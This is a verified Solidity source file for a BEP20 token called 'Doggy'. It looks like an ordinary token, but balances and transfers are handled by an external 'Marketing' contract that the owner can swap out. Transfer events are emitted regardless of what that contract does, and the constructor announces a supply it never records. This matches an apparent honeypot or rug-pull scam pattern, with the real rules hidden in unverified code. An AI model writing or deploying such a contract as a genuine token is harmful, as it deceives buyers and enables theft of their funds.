/**
 *Submitted for verification at Etherscan.io on 2022-02-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-16
*/

pragma solidity ^0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    function totalSupply() public view returns (uint256);
    function decimals() public view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract Marketing {
    function doTransfer(address caller, address from, address to, uint amount) public returns (bool);
    function balanceOf(address who) public constant returns (uint256);
}

contract Doggy is BEP20 {
    using SafeMath for uint256;

    address public owner = msg.sender;    
    string public name = "Doggy";
    string public symbol = "DOGGY";
    uint8 public decimals;
    uint public totalSupply;
    
    mapping (address => mapping (address => uint256)) private allowed;
    address private marketing;
    
    constructor() public {
        decimals = 9;
        totalSupply = 1000000 * 10 ** 9;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return totalSupply;
    }

    function decimals() public view returns (uint8) {
        return decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) constant public returns (uint256) {
        return Marketing(marketing).balanceOf(who);
    }
    
    function allowance(address who, address spender) constant public returns (uint256) {
        return allowed[who][spender];
    }
    
    function setMarketingAddress(address marketingAddress) public {
        require(msg.sender == owner);
        marketing = marketingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return Marketing(marketing).doTransfer(msg.sender, msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return Marketing(marketing).doTransfer(msg.sender, from, to, amount);
    }
        
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

}